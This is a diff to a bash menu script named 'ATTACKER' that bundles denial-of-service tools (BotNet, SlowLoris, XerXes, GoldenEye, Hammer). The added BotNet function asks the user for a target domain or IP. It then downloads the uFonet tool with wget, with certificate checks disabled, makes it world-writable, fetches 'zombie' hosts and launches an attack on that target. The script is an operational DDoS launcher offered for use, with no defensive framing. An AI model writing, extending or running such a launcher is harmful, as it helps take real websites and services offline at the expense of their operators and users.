@@ -58,6 +58,53 @@ PS3="ATTACKER>> "
 ###START BOTNET###
 BotNet()
 {
+echo "" && echo -e "$cyan"
+echo -n -e "  Please Enter A domain Exp, http://google.com or IP - "
+read Domain
+if [ -z "$Domain" ]; then
+		
+ 				echo -n -e $red"  Do you want exit?$cyan ( Yes / No ) : " ;tput sgr0
+					read back
+						if [ -z "$back" ]; then
+							exit
+							fi
+						if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
+												then
+													echo "" && echo -e $BlueF" [$white"*"$BlueF]$red  Exiting ..." && sleep 0.2
+                                                 	echo -e $BlueF" [$white"*"$BlueF]$red  GoodBye!"
+	                                                exit 0
+										elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
+												then
+												clear
+                                                attacker
+		
+	fi
+fi
+echo "" && echo -e "$cyan"
+echo -e "  Checking uFonet .. "
+cd tools
+if [ ! -d "ufonet" ]; then
+echo -e $red"  uFonet Not Found ! .. "
+echo ""
+echo -e "  Wait for downloading"
+echo ""
+sleep 2
+wget --no-check-certificate https://sourceforge.net/projects/ufonet/files/latest/download
+unzip "download" && rm download && clear
+fi
+if [ -d "ufonet" ]; then
+echo ""
+echo -e "  uFonet found"
+echo ""
+echo -e "     ...:$BlueF Attacking Now $cyan:..."
+echo ""
+cd ufonet
+chmod 777 ufonet
+./ufonet --download-zombies
+./ufonet -a $Domain
+else
+echo "We have a problem ! sorry"
+fi
 }
 ####END BOTNET###
 #################
@@ -67,6 +114,7 @@ BotNet()
 ##START SLOWLORIS##
 SlowLoris()
 {
+echo ""
 }
 ##END SLOWLORIS##
 #################
@@ -90,8 +138,8 @@ echo ""
 echo -e "$white       |--------- Author: Mr. H4CK3R | FB.com/AriR.Abdulla ---------|"
 echo "" && echo "" && echo "" && echo -e "$green" && sleep 0.9
 echo -e $BlueF"	[$white"01"$BlueF]$cyan  BotNet             $BlueF	[$white"05"$BlueF]$cyan  Hammer"
-echo -e $BlueF"	[$white"02"$BlueF]$cyan  SlowLoris          $BlueF	[$white"06"$BlueF]$cyan  Enable Wlan0mon"
-echo -e $BlueF"	[$white"03"$BlueF]$cyan  XerXes             $BlueF	[$white"07"$BlueF]$cyan  Enable Anonym8"
+echo -e $BlueF"	[$white"02"$BlueF]$cyan  SlowLoris          $BlueF	[$white"06"$BlueF]$cyan  "
+echo -e $BlueF"	[$white"03"$BlueF]$cyan  XerXes             $BlueF	[$white"07"$BlueF]$cyan  "
 echo -e $BlueF"	[$white"04"$BlueF]$cyan  GoldenEye          $BlueF	[$white"08"$BlueF]$cyan  Exit"
 echo -e " " && echo -e ""
 echo -n -e $red'  \033[4mATTACKER:\033[0m >> '; tput sgr0 #insert your choice
